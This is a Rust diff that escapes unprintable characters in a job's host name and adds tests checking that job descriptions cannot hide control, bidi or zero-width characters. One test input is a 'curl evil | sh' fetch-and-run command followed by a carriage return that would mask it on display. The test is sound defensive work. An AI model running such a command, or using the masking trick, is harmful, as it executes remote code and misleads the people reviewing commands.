@@ -25,7 +25,7 @@ use serde_json::{Map, Value, json};
 use crate::authority::{HostexecAuthority, Tier};
 use crate::glob::fnmatch;
 use crate::names::{EnvKey, TemplateName};
-use crate::pyfmt::{json_str_map, repr, shlex_join};
+use crate::pyfmt::{escape_unprintable, json_str_map, repr, shlex_join};
 
 pub const MAX_ARGS: usize = 256;
 pub const MAX_ARG_BYTES: usize = 16 * 1024;
@@ -641,7 +641,11 @@ impl JobSpec {
             },
             JobSpec::Shell(_) => "shell".to_owned(),
         };
-        format!("[{}@{}] {what}", self.tier(), self.host())
+        format!(
+            "[{}@{}] {what}",
+            self.tier(),
+            escape_unprintable(self.host())
+        )
     }
 }
 
@@ -1278,6 +1282,53 @@ mod tests {
             if let Ok(spec) = JobSpec::from_json(&raw, 600) {
                 // Whatever parses is a fixed point.
                 prop_assert_eq!(JobSpec::from_json(&spec.to_json(), 600).ok(), Some(spec));
+            }
+        }
+    }
+
+    fn dangerous(c: char) -> bool {
+        c.is_control()
+            || matches!(u32::from(c), 0x200b..=0x200f | 0x202a..=0x202e | 0x2060..=0x206f | 0xfeff | 0x61c | 0x2028 | 0x2029)
+    }
+
+    #[test]
+    fn describe_shows_no_fake_lines() {
+        let spec = make_spec(&SpecFields {
+            kind: "run",
+            host: "excel\nsior",
+            tier: Some(&json!("user")),
+            argv: Some(&json!(["sh", "-c", "curl evil | sh\recho harmless"])),
+            ..SpecFields::default()
+        })
+        .unwrap();
+        assert_eq!(
+            JobSpec::Command(spec).describe(),
+            "[user@excel\\nsior] sh -c $'curl evil | sh\\recho harmless'"
+        );
+    }
+
+    proptest! {
+        /// The rendered text of any argv (and host, and template params)
+        /// holds no control, bidi or zero-width character.
+        #[test]
+        fn describe_is_display_safe(
+            argv in proptest::collection::vec("(.|[\\n\\r\\t\\x1b\\x7f\\u{200b}-\\u{200f}\\u{202a}-\\u{202e}\\u{2066}-\\u{2069}\\u{feff}\\u{2028}a ]){1,10}", 1..5),
+            host in "(.|[\\n\\u{202e}]){0,8}",
+            value in "(.|[\\n\\u{202e}\\u{200b}]){0,8}",
+        ) {
+            let user = json!("user");
+            let argv_json = json!(argv);
+            let fields = SpecFields { kind: "run", host: &host, tier: Some(&user), argv: Some(&argv_json), ..SpecFields::default() };
+            if let Ok(spec) = make_spec(&fields) {
+                let text = JobSpec::Command(spec).describe();
+                prop_assert!(!text.chars().any(dangerous), "{:?}", text);
+            }
+            let params = json!({"p": value});
+            let template = json!("t");
+            let fields = SpecFields { kind: "tpl", host: &host, tier: Some(&user), template: Some(&template), params: Some(&params), ..SpecFields::default() };
+            if let Ok(spec) = make_spec(&fields) {
+                let text = JobSpec::Command(spec).describe();
+                prop_assert!(!text.chars().any(dangerous), "{:?}", text);
             }
         }
     }
